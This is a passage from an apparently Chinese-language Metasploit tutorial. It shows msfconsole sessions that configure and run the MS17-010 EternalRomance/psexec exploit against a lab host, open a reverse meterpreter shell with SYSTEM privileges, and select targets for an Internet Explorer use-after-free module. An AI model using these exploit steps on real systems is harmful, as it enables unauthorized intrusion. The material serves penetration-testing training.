class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">     Module: exploit/windows/smb/ms17_010_psexec</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: x86, x64</span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Normal</span><br><span class="line">  Disclosed: 2017-03-14</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  sleepya</span><br><span class="line">  zerosum0x0</span><br><span class="line">  Shadow Brokers</span><br><span class="line">  Equation Group</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic</span><br><span class="line">  1   PowerShell</span><br><span class="line">  2   Native upload</span><br><span class="line">  3   MOF upload</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name                  Current Setting                          Required  Description</span><br><span class="line">  ----                  ---------------                          --------  -----------</span><br><span class="line">  DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">  LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">  NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">  NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                        rdlists/named_pipes.txt</span><br><span class="line">  RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/</span><br><span class="line">                                                                           wiki/Using-Metasploit</span><br><span class="line">  RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">  SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">  SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">  SERVICE_NAME                                                   no        The service name</span><br><span class="line">  SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor</span><br><span class="line">                                                                           mal read/write folder share</span><br><span class="line">  SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">  SMBPass                                                        no        The password for the specified username</span><br><span class="line">  SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 3072</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module will exploit SMB with vulnerabilities in MS17-010 to </span><br><span class="line">  achieve a write-what-where primitive. This will then be used to </span><br><span class="line">  overwrite the connection session information with as an </span><br><span class="line">  Administrator session. From there, the normal psexec payload code </span><br><span class="line">  execution is done. Exploits a type confusion between Transaction and </span><br><span class="line">  WriteAndX requests and a race condition in Transaction requests, as </span><br><span class="line">  seen in the EternalRomance, EternalChampion, and EternalSynergy </span><br><span class="line">  exploits. This exploit chain is more reliable than the EternalBlue </span><br><span class="line">  exploit, but requires a named pipe.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2017-0143</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2017-0146</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2017-0147</span><br><span class="line">  https://github.com/worawit/MS17-010</span><br><span class="line">  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf</span><br><span class="line">  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/</span><br><span class="line"></span><br><span class="line">Also known as:</span><br><span class="line">  ETERNALSYNERGY</span><br><span class="line">  ETERNALROMANCE</span><br><span class="line">  ETERNALCHAMPION</span><br><span class="line">  ETERNALBLUE</span><br></pre></td></tr></table></figure><p>在我们对所选模块适合我们的目的感到满意之后，我们需要设置一些规范来自定义模块以成功地针对我们的目标主机使用它，例如设置目标（或<code>RHOST</code>）<code>RHOSTS</code>。</p><h4 id="MSF-目标规范"><a href="#MSF-目标规范" class="headerlink" title="MSF - 目标规范"></a>MSF - 目标规范</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; set RHOSTS 10.10.10.40</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; 10.10.10.40</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><p>此外，还有一个选项<code>setg</code>，它指定我们选择的选项在程序重新启动之前是永久的。因此，如果我们在特定的目标主机上工作，我们可以使用此命令设置 IP 地址一次，并且在我们将焦点转移到不同的 IP 地址之前不再更改它。</p><h4 id="MSF-永久目标规范"><a href="#MSF-永久目标规范" class="headerlink" title="MSF - 永久目标规范"></a>MSF - 永久目标规范</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; setg RHOSTS 10.10.10.40</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; 10.10.10.40</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><p>一旦一切就绪并准备就绪，我们就可以继续发起攻击。请注意，此处未设置有效载荷，因为默认的有效载荷足以进行此演示。</p><h4 id="MSF-利用执行"><a href="#MSF-利用执行" class="headerlink" title="MSF - 利用执行"></a>MSF - 利用执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.15:4444 </span><br><span class="line">[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 10.10.10.40:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.10.40:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.10.40:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.10.40:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.10.40:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.10.40:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.10.40:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.10.40:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Command shell session 1 opened (10.10.14.15:4444 -&gt; 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter&gt; shell</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><p>我们现在在目标机器上有一个 shell，我们可以与它交互。</p><h4 id="MSF-目标交互"><a href="#MSF-目标交互" class="headerlink" title="MSF - 目标交互"></a>MSF - 目标交互</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt; whoami</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure><p>这是一个如何<code>msfconsole</code>快速提供帮助的快速而肮脏的示例，但却是该框架如何工作的一个很好的示例。只需要一个模块，没有任何<code>payload</code>选择，<code>encoding</code>或者<code>pivoting</code>在会话或作业之间。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p><code>Targets</code>是从那些特定操作系统的版本中获取的唯一操作系统标识符，这些操作系统使选定的漏洞利用模块可以在该特定版本的操作系统上运行。在漏洞利用模块视图中发出的命令<code>show targets</code>将显示该特定漏洞利用的所有可用漏洞目标，而在根菜单中发出相同的命令，在任何选定的漏洞利用模块之外，将让我们知道我们需要首先选择一个漏洞利用模块。</p><h4 id="MSF-显示目标"><a href="#MSF-显示目标" class="headerlink" title="MSF - 显示目标"></a>MSF - 显示目标</h4><p> MSF - 显示目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; show targets</span><br><span class="line"></span><br><span class="line">[-] No exploit module selected.</span><br></pre></td></tr></table></figure><p>当查看我们之前的漏洞利用模块时，这将是我们看到的：</p><p> MSF - 显示目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><h3 id="选择目标"><a href="#选择目标" class="headerlink" title="选择目标"></a>选择目标</h3><p>我们可以看到这种类型的攻击只有一种通用类型的目标集。如果我们将漏洞利用模块更改为需要更具体目标范围的东西会怎样？以下漏洞利用的目的是：</p><ul><li><code>MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability</code>.</li></ul><p>如果我们想了解更多关于这个特定模块的信息以及它背后的漏洞是干什么的，我们可以使用命令<code>info</code>。当我们不确定不同漏洞利用或辅助模块的来源或功能时，此命令可以帮助我们。请记住，审核我们的代码以获取任何工件生成或“附加功能”始终被认为是最佳实践，该<code>info</code>命令应该是我们在使用新模块时采取的首要步骤之一。通过这种方式，我们可以熟悉漏洞利用功能，同时确保为我们的客户和我们提供安全、干净的工作环境。</p><h4 id="MSF-目标选择"><a href="#MSF-目标选择" class="headerlink" title="MSF - 目标选择"></a>MSF - 目标选择</h4><p> MSF - 目标选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability </span><br><span class="line">     Module: exploit/windows/browser/ie_execcommand_uaf</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Good</span><br><span class="line">  Disclosed: 2012-09-14</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  unknown</span><br><span class="line">  eromang</span><br><span class="line">  binjo</span><br><span class="line">  sinn3r &lt;sinn3r@metasploit.com&gt;</span><br><span class="line">  juan vazquez &lt;juan.vazquez@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic</span><br><span class="line">  1   IE 7 on Windows XP SP3</span><br><span class="line">  2   IE 8 on Windows XP SP3</span><br><span class="line">  3   IE 7 on Windows Vista</span><br><span class="line">  4   IE 8 on Windows Vista</span><br><span class="line">  5   IE 8 on Windows 7</span><br><span class="line">  6   IE 9 on Windows 7</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name       Current Setting  Required  Description</span><br><span class="line">  ----       ---------------  --------  -----------</span><br><span class="line">  OBFUSCATE  false            no        Enable JavaScript obfuscation</span><br><span class="line">  SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">  SRVPORT    8080             yes       The local port to listen on.</span><br><span class="line">  SSL        false            no        Negotiate SSL for incoming connections</span><br><span class="line">  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">  URIPATH                     no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a vulnerability found in Microsoft Internet </span><br><span class="line">  Explorer (MSIE). When rendering an HTML page, the CMshtmlEd object </span><br><span class="line">  gets deleted in an unexpected manner, but the same memory is reused </span><br><span class="line">  again later in the CMshtmlEd::Exec() function, leading to a </span><br><span class="line">  use-after-free condition. Please note that this vulnerability has </span><br><span class="line">  been exploited since Sep 14, 2012. Also, note that </span><br><span class="line">  presently, this module has some target dependencies for the ROP </span><br><span class="line">  chain to be valid. For WinXP SP3 with IE8, msvcrt must be present </span><br><span class="line">  (as it is by default). For Vista or Win7 with IE8, or Win7 with IE9, </span><br><span class="line">  JRE 1.6.x or below must be installed (which is often the case).</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-2012-4969/</span><br><span class="line">  OSVDB (85532)</span><br><span class="line">  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-063</span><br><span class="line">  http://technet.microsoft.com/en-us/security/advisory/2757760</span><br><span class="line">  http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/</span><br></pre></td></tr></table></figure><p>查看描述，我们可以大致了解此漏洞利用将为我们完成什么。牢记这一点，我们接下来要检查哪些版本容易受到此漏洞的攻击。</p><p> MSF - 目标选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/browser/ie_execcommand_uaf):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   OBFUSCATE  false            no        Enable JavaScript obfuscation</span><br><span class="line">   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT    8080             yes       The local port to listen on.</span><br><span class="line">   SSL        false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                     no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">   1   IE 7 on Windows XP SP3</span><br><span class="line">   2   IE 8 on Windows XP SP3</span><br><span class="line">   3   IE 7 on Windows Vista</span><br><span class="line">   4   IE 8 on Windows Vista</span><br><span class="line">   5   IE 8 on Windows 7</span><br><span class="line">   6   IE 9 on Windows 7</span><br></pre></td></tr></table></figure><p>我们看到了不同版本的 Internet Explorer 和各种 Windows 版本的选项。保留选择将<code>Automatic</code>让 msfconsole 